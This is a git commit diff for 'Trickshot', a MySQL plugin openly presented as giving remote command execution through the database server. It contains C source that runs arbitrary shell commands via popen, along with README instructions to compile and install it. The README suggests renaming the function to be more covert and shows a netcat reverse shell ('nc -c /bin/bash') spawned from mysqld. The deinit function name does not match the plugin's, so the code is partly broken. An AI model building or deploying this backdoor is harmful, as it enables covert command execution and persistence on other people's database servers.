3b7f7ff1e593a52146153a2ae7558cdddef445fa
root <root@localhost.localdomain>
2018-12-16 00:50:16 -0500

    official the MVP with some docs

--- README.md
+++ README.md
@@ -1,2 +1,49 @@
 # Trickshot
 A MYSQL plugin that allows RCE through the MYSQL Server
+
+# Installation
+To install this lovely plugin first you must first compile it to a shared object like below.
+
+```
+gcc -I/usr/include/mysql -shared -fPIC -o tg.so trickshot.c
+```
+
+Then you must copy the `.so` file to the MYSQL plugin directory like so:
+
+```
+cp -f tg.so /usr/lib64/mysql/plugin/
+```
+
+Then remove into your MYSQL server and run the following query:
+
+```
+CREATE FUNCTION trickshot RETURNS STRING SONAME "tg.so";
+```
+
+Note: the `trickshot` portion of the MYSQL command can be swapped out to be more covert. The plugin is now installed.
+
+# Usage
+To use this plugin simply run the `trickshot` function inside a MYSQL query. An example is shown below.
+
+```
+MariaDB [(none)]> select trickshot("whoami");
++---------------------+
+| trickshot("whoami") |
++---------------------+
+| mysql               |
++---------------------+
+1 row in set (0.04 sec)
+```
+
+For those curious, if one were to setup a reverse shell from this exploit and a blue team member ran `ps -fax` then they would see something like the following output while the shell was active.
+
+```
+ 22077 ?        Ss     0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+ 83370 ?        Sl     0:00  \_ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var
+ 83526 ?        S      0:00      \_ sh -c nc -c /bin/bash localhost 4444 2>&1
+ 83527 ?        S      0:00          \_ nc -c /bin/bash localhost 4444
+ 83528 ?        S      0:00              \_ /bin/bash
+```
+
+# Resources
+[The official MYSQL UDF References](https://dev.mysql.com/doc/refman/8.0/en/adding-udf.html)))
--- trickshot.c
+++ trickshot.c
@@ -1,31 +1,20 @@
-
 #include <string.h>
 #include <stdlib.h>
+#include <stdio.h>
 
 #include <mysql.h>
-
-char *buff;
-unsigned int bsize = 256;
-
-static my_bool trickshot_init(UDF_INIT *initid, UDF_ARGS *args ,char *message);
-static char *trickshot(UDF_INIT *initid,UDF_ARGS *args,char *is_null,char *error);
-static void trickshot_deinit(UDF_INIT *initid);
 
 
 my_bool trickshot_init(UDF_INIT *initid, UDF_ARGS *args, char *message){
     if(args->arg_count != 1 || args->arg_type[0] != STRING_RESULT){
-        strcpy(message, "trickshot(): Incorrect usage... >:(");
+        strcpy(message, "Incorrect usage...");
         return 1;
     }
-    buff = calloc(bsize, 1);
+    initid->ptr = malloc(1);
     return 0;
 }
 
-void trickshot_deinit(UDF_INIT *initid){
-    free(buff);
-}
-
-char *trickshot(UDF_INIT *initid,UDF_ARGS *args,char *is_null,char *error){
+char *trickshot(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error){
     char *cmd = args->args[0];
     size_t cmd_len = strlen(cmd);
     FILE *fd;
@@ -37,21 +26,25 @@ char *trickshot(UDF_INIT *initid,UDF_ARGS *args,char *is_null,char *error){
     char buffer[256];
     size_t chread;
     /* String to store entire command contents in */
-    size_t comalloc = 256;
+    size_t comalloc = 1;
     size_t comlen   = 0;
-    char *comout   = malloc(comalloc);
  
     /* Use fread so binary data is dealt with correctly */
     while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
         if (comlen + chread >= comalloc) {
-            comalloc *= 2;
-            comout = realloc(comout, comalloc);
+            comalloc += chread;
+            initid->ptr = realloc(initid->ptr, comalloc);
         }
-        memmove(comout + comlen, buffer, chread);
+        memmove(initid->ptr + comlen, buffer, chread);
         comlen += chread;
     }
     pclose(fd);
     free(safe_command);
-    return comout;
+    *length = comlen-1;
+    return initid->ptr;
+}
+
+void sys_exec_deinit(UDF_INIT *initid){
+    free(initid->ptr);
 }
 
